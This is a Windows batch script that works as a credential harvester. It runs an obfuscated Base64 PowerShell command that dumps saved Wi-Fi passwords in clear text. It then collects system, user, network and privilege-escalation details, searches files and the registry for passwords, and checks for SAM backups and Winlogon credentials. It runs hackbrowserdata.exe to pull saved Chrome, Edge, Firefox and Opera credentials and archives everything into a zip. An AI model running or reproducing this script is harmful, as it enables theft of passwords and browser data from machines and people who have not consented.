@echo off
:: variables
echo SET odrive=%odrive:~0,2%
echo set varname = odrive
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
cd %USERPROFILE%
mkdir Results4HackedPC
cd Results4HackedPC
mkdir WifiPasswords
cd WifiPasswords
powershell -EncodedCommand "KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAcwApACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAcIFwAOgAoAC4AKwApACQAHSAgAHwAIAAlAHsAJABuAGEAbQBlAD0AJABfAC4ATQBhAHQAYwBoAGUAcwAuAEcAcgBvAHUAcABzAFsAMQBdAC4AVgBhAGwAdQBlAC4AVAByAGkAbQAoACkAOwAgACQAXwB9ACAAfAAgACUAewAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQAgAG4AYQBtAGUAPQAdICQAbgBhAG0AZQAdICAAawBlAHkAPQBjAGwAZQBhAHIAKQB9ACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAcIEsAZQB5ACAAQwBvAG4AdABlAG4AdABcAFcAKwBcADoAKAAuACsAKQAkAB0gIAB8ACAAJQB7ACQAcABhAHMAcwA9ACQAXwAuAE0AYQB0AGMAaABlAHMALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAuAFQAcgBpAG0AKAApADsAIAAkAF8AfQAgAHwAIAAlAHsAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsAIABQAFIATwBGAEkATABFAF8ATgBBAE0ARQA9ACQAbgBhAG0AZQA7AFAAQQBTAFMAVwBPAFIARAA9ACQAcABhAHMAcwAgAH0AfQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAFcAaQBmAGkAUABhAHMAcwB3AG8AcgBkAC4AdAB4AHQA"

cd..



powershell -c "Start-Process 'systeminfo' -NoNewWindow -Wait"
powershell -c "Get-ChildItem Env: | ft Key,Value"
powershell -c "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address"
powershell -c "Get-DnsClientServerAddress -AddressFamily IPv4 | ft"
powershell -c "Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State"
powershell -c "Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex"
powershell -c "Start-Process 'netstat' -ArgumentList '-ano' -NoNewWindow -Wait | ft"
powershell -c "Get-PSDrive | where {$_.Provider -like 'Microsoft.PowerShell.Core\FileSystem'}| ft"
powershell -c "Start-Process 'netsh' -ArgumentList 'firewall show config' -NoNewWindow -Wait | ft"
powershell -c "Write-Host $env:UserDomain\$env:UserName"
powershell -c "start-process 'whoami' -ArgumentList '/priv' -NoNewWindow -Wait | ft"
powershell -c "Get-LocalUser | ft Name,Enabled,LastLogon"
powershell -c "Start-Process 'qwinsta' -NoNewWindow -Wait | ft"
powershell -c "start-process 'cmdkey' -ArgumentList "/list" -NoNewWindow -Wait | ft"
powershell -c "Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select 'Default*' | ft"
powershell -c "Get-LocalGroup | ft Name"
powershell -c "Get-LocalGroupMember Administrators | ft Name, PrincipalSource"
powershell -c "Get-ChildItem C:\Users | ft Name"
powershell -c "Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM"
powershell -c "gwmi -Query 'Select * from Win32_Process' | where {$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label='Owner';Expression={$_.GetOwner().User}} | ft -AutoSize"
powershell -c "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"
powershell -c "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name"
powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} | ft"
powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} | ft"
powershell -c "Test-Path -Path 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer' | ft"
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
powershell -c "Get-ChildItem C:\Windows\Tasks | ft"
powershell -c "Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl"
powershell -c "Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like '*.xml' -or $_.Name -like '*.txt' -or $_.Name -like '*.ini')}"
powershell -c "Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike '*C:\temp*' -and $_.PSParentPath -notlike '*Reference Assemblies*' -and $_.PSParentPath -notlike '*Windows Kits*'}| Select-String -Pattern 'password'"
powershell -c "reg query HKLM /f password /t REG_SZ /s"
powershell -c "reg query HKCU /f password /t REG_SZ /s"



mkdir Hacked-Browsers-Credintionals
cd Hacked-Browsers-Credintionals
%~dp0hackbrowserdata.exe -b chrome -f json --results-dir Chrome
%~dp0hackbrowserdata.exe -b edge -f json --results-dir Microsoft-Edge
%~dp0hackbrowserdata.exe -b firefox -f json --results-dir FireFox
%~dp0hackbrowserdata.exe -b opera -f json --results-dir Opera
cd %USERPROFILE%
powershell -c "Compress-Archive Results4HackedPC Results4HackedPC.zip"
@echo off
pause
